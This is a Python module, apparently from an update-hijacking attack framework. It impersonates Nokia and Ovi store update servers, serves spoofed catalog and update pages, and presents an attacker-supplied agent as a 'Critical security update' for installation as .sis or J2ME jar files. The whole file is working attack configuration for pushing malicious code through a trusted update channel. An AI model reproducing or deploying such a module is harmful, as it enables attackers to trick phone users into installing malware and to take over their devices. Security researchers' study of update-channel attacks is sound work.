from modules import ModuleBase


class nokia(ModuleBase):
    name = 'nokia'
    version = '1.0'
    appver = '< 3.1.736 (nokia firmware v20.2.011)'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    #http://cgw.download.nokia.com/ntp-cgw/catalogs/
    agent_filename = './include/nokia/install.sis'
    vh = '(config.preminetsolution.com|cgw.download.nokia.com|store.ovi.mobi)' 
    requests = [
        {   'path': '^/$', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/req1',
        },
        {   'path': '/ntp-cgw/catalogs/', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/catalog',
        },
        {   'path': '/\?cid\=ovistore', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/update.html',
        },
        {   'path': '/ovi.png', #10.0
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/ovi.png',
        },
        {   'path': '/favicon.ico', #10.0
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/ovi.ico',
        },

        {   'path': '/style.css', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/style.css',
        },

        ## Agent install
        {   'path': '/j2me.jad', #10.0
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/j2me.jad',
        },

        {   'path': '/j2me.jar', #10.0
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/j2me.jar',
        },

        {   'path': '.sis',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        },

        {   'path': '/JarInstallNotify', #10.0
            'type': 'install',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/nokia/ovi.ico',
        }
    ]
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "30.' + rand_num(1) + '.' + rand_num(4) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }